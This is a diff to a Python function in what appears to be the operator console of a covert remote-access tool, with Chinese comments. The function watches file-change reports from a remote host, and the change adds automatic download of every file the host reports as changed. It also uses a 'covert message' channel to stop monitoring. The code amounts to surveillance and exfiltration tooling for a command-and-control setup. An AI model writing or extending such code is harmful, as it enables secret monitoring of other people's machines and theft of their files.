@@ -360,15 +360,14 @@ def cmd_monitor_file(comm: Commander):
                 if data is None:
                     continue
 
-                # —— 1. 二进制文件推送 ——
+                # —— 1. 二进制文件推送（文件内容直接发送的情况） ——
                 if data.startswith(b"FILE_TRANSFER:"):
-                    # 拆 header
                     parts = data.split(b":", 2)
                     if len(parts) == 3:
                         filename = parts[1].decode()
                         file_bytes = parts[2]
                         print(f"[DEBUG][Commander] Received FILE_TRANSFER for {filename}, {len(file_bytes)} bytes")
-                        # 保存到根目录
+                        # 保存文件到当前目录
                         with open(filename, "wb") as out:
                             out.write(file_bytes)
                         print(f"[*] 已接收并保存文件：{filename}")
@@ -376,8 +375,7 @@ def cmd_monitor_file(comm: Commander):
                         print("[!] 文件传输消息格式错误")
                     continue
 
-                # —— 2. 原有 JSON 日志推送 ——
-
+                # —— 2. JSON 日志推送（文件变动通知） ——
                 try:
                     line = data.decode('utf-8', errors='ignore').strip()
                     print(f"[DEBUG][Commander] JSON line: {line}")
@@ -385,24 +383,36 @@ def cmd_monitor_file(comm: Commander):
                     print(f"[DEBUG][Commander] Parsed JSON msg: {msg}")
                 except Exception as e:
                     print(f"[DEBUG][Commander] JSON parse error: {e}")
-
-                continue
+                    continue
 
                 ts = msg.get('timestamp', '')
                 typ = msg.get('type', '')
                 path = msg.get('path', '')
                 content = msg.get('content', '')
 
-                # 打印并记录到日志
+                # 打印关键信息
                 print(f"[{ts}] {typ} | {path}")
-                print(content)
+                if content:
+                    print(content)
+                # **新功能**：输出变动文件路径并下载文件
+                if path:
+                    print(f"[*] 变动文件路径：{path}")
+                    try:
+                        local_name = os.path.basename(path)
+                        success = comm.download_file_with_debug(path, local_name)
+                        if not success:
+                            print(f"[!] 下载文件失败：{path}")
+                    except Exception as e:
+                        print(f"[!] 下载文件 {path} 时发生异常：{e}")
                 print("-" * 40)
+                # 将原始日志内容追加写入日志文件
                 logfile.write(line + "\n")
                 logfile.flush()
 
         except KeyboardInterrupt:
             print("\n[*] 停止文件监控。")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
+
 
 
 def cmd_monitor_dir(comm: Commander):
